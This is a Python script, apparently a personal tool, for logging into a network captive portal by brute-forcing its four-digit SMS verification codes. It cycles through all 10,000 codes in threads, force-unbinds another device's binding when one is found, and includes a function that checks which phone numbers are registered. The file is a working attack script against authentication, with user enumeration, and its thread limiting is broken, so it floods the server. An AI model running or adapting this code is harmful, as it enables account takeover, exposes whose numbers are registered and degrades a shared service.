# @Time    : 2024/9/1 19:39
# @Author  : TwoOnefour
# @blog    : https://www.pursuecode.cn
# @Email   : twoonefour@pursuecode.cn
# @File    : login.py

from threading import Thread
import requests
import sys


def run(code, phone):
    res = requests.post("http://10.19.1.1/vcpe/userAuthenticate/authenticate", json={
        "mobile": str(phone),
        "acCode": code,
        "name": "Windows电脑  "
    },
    verify=False,
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
        'Content-Type': 'application/json;charset=UTF-8'
    })
    if res.json()["result"] != "-1":
        if res.json()["result"] == "2":
            tmpjson = res.json()["pointList"][0]
            unbind(tmpjson)
            run(code, phone)  # 递归一次
        print("登陆成功")
        sys.exit(0)
    elif res.json().get("result") and res.json()["msg"] != "验证码不正确，请重新获取":
        print(res.json()["msg"])
        print(f"当前验证码为{code}")
        sys.exit(-1)

def unbind(info):
    res = requests.post("http://10.19.1.1/vcpe/userAuthenticate/unBindPortalUserMac", json=info,
    headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
        'Content-Type': 'application/json;charset=UTF-8'
    })
    print(res.json())

def getphones(num):
    res = requests.post("http://10.19.1.1/vcpe/userAuthenticate/sendAuthenticateCode", json={
        "mobile": str(num)
    }, verify=False, headers={
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
        'Content-Type': 'application/json;charset=UTF-8'
    })
    if res.json()["msg"] != "手机号不存在":
        print(num)


def sendsms(phone):
    res = requests.post("http://10.19.1.1/vcpe/userAuthenticate/sendAuthenticateCode", json={
        "mobile": str(phone)
    })
    print(res.json())

def login(phonenum):
    codes = [str(_) for _ in range(8000, 10000)] + [str(_) for _ in range(1000, 8000)] + [f"{_:04}" for _ in range(0, 1000)]
    sendsms(phonenum)
    for _ in codes:
        threads = []
        t = Thread(target=run, args=(_, phonenum))
        threads.append(t)
        t.start()
        if len(threads) == 8:
            for i in threads:
                i.join()
            threads.clear()



if __name__ == "__main__":
    login(xxxxxx)  # 这里改为你的手机账号
